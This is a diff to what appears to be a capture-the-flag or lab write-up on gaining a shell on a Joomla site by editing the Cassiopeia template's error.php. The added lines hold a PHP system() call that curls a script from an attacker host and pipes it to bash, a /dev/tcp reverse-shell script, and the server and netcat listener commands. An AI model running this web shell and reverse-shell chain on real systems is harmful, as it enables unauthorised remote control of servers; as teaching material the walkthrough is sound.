@@ -195,6 +195,44 @@ Navigate the site to System > Site Templates > Cassiopeia Details and Files.
 <br>
 We can edit one of the unused php documents to give ourselves a reverse shell. I choose to use error.php.
 
+We will use system() function to run curl and fetch a bash script from our attacker python webserver, executing and sending a reverse shell connection. 
+
+```
+<?php system("curl [attacker_IP]:8000/rev.sh|bash"); ?>
+```
+<br>
+<img width="1743" height="762" alt="image" src="https://github.com/user-attachments/assets/67015752-7e9d-4546-a24f-860e43e3fb2f" />
+<br>
+<br>
+Let's create rev.sh, the file which will be hosted on our attacker machine, which will then be called into the target machine to send a reverse connection back to us.
+<br>
+<br>
+
+```
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/[attacker_IP]/4444 0>&1' > rev.sh
+```
+With the preparation complete, we can now start a python webserver and host rev.sh
+
+```
+python3 -m http.server 8000
+```
+<img width="524" height="55" alt="image" src="https://github.com/user-attachments/assets/4ceeb09e-389e-4836-bbf5-2b98966481ef" />
+<br>
+<br>
+
+We also need to start a netcat listener to catch the reverse connection.
+<br>
+<br>
+
+```
+nc -lnvp 4444
+```
+<img width="263" height="51" alt="image" src="https://github.com/user-attachments/assets/af160bf8-316a-4588-ab31-b60c53fd72c8" />
+
+
+
+
+
 
 
 
